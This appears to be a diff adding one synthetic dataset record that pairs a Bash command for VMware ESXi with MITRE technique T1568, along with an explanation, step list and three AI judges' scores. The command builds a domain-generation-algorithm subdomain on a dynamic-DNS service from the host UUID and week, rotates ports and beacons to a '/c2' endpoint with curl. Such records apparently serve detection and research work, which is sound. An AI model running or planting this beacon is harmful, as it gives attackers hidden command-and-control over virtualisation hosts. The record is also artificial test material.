@@ -1,0 +1,58 @@
+{
+  "technique_id": "T1568",
+  "platform": "ESXi",
+  "shell": "Bash",
+  "command": "seed=\"$(esxcli system uuid get 2>/dev/null || hostname -s)$(date -u +%Y%W)\"; sub=$(echo -n \"$seed\" | sha1sum | cut -c1-18); dom=\"$sub.ddns.net\"; ports=(443 8443 10443 16443); port=\"${ports[$(($(date -u +%S) % ${#ports[@]}))]}\"; curl --retry 1 --connect-timeout 4 \"https://$dom:$port/c2\"",
+  "explanation": "Uses the ESXi host UUID combined with the week to produce a deterministic DGA domain and rotates among a small set of ports to evade static detection. This exemplifies dynamic DNS/DGA usage under T1568.",
+  "rationale_steps": [
+    "Acquire a stable host UUID (fallback to hostname).",
+    "Hash with the current week to produce a predictable DGA label.",
+    "Pick a port from a rotating list based on seconds.",
+    "Attempt a curl connection to the dynamically resolved domain."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-BASH-T1568-0d44a1cb-560f0702",
+  "source_prompt_hash": "0d44a1cb",
+  "timestamp_utc": "2025-09-30T04:15:38.906305Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judgments": [
+      {
+        "model": "claude-3-7-sonnet",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed with balanced quotes, proper command separators, valid flags, and correct syntax for variable assignments, command substitutions, and arithmetic operations.",
+        "semantic_score": 5,
+        "semantic_justification": "The command perfectly implements T1568 (Dynamic Resolution) by generating a deterministic domain based on host UUID and current date, rotating through ports based on seconds, and attempting to connect to a C2 server using the dynamically generated endpoint.",
+        "combined_score": 5.0,
+        "confidence": 0.95,
+        "timestamp": "2025-10-02T05:40:12.961443Z"
+      },
+      {
+        "model": "gemini-2.0-flash-thinking-exp",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed, with balanced quotes, correct command substitutions, arithmetic expansions, array manipulations, and valid flags for all utilities.",
+        "semantic_score": 5,
+        "semantic_justification": "The command perfectly achieves the claimed intent by demonstrating a deterministic DGA using host UUID and weekly rotation, combined with dynamic port rotation, directly embodying T1568 Dynamic Resolution for C2 beaconing.",
+        "combined_score": 5.0,
+        "confidence": 1,
+        "timestamp": "2025-10-02T05:40:28.308273Z"
+      },
+      {
+        "model": "gpt-5",
+        "syntactic_score": 5,
+        "syntactic_justification": "Well-formed Bash with balanced quoting, valid substitutions, arithmetic and array usage, and correct curl flags and separators.",
+        "semantic_score": 5,
+        "semantic_justification": "Computes a deterministic DGA-like subdomain from host/week data, rotates ports by time, and attempts HTTPS C2, aligning with T1568 dynamic resolution behavior.",
+        "combined_score": 5.0,
+        "confidence": 0.9,
+        "timestamp": "2025-10-02T05:40:49.685410Z"
+      }
+    ],
+    "llm_average_syntactic": 5.0,
+    "llm_average_semantic": 5.0,
+    "llm_average_score": 5.0,
+    "llm_verdict": "likely_match",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
